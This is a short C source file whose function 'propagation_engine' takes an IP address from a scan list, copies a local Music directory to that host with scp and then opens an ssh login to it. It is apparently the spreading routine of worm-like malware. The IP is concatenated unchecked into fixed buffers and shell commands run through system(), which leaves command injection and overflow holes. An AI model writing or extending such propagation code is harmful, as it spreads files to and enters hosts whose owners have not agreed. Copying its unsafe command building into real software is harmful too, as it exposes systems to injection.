#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void propagation_engine(char* ip){
    char command[256];
    char dir[50];   
    char pass[50]; 

    if(ip == NULL || strlen(ip) == 0){
        printf("Nao foi possivel obter um IP, verifique se o arquivo de varredura nao esta vazio.\n");
        exit(0);
    }

    strcpy(command, "scp -r ../Music/ kath@");
    strcat(command, ip);
    strcpy(dir, ":/home/kath\n");
    strcat(command, dir);
    system(command);

    memset(command, 0, 256);
    memset(dir, 0, 50);

    strcpy(command, "ssh klg@");
    strcat(command, ip);
    strcpy(dir, " \n");
    strcat(command, dir);
    system(command);
       
}
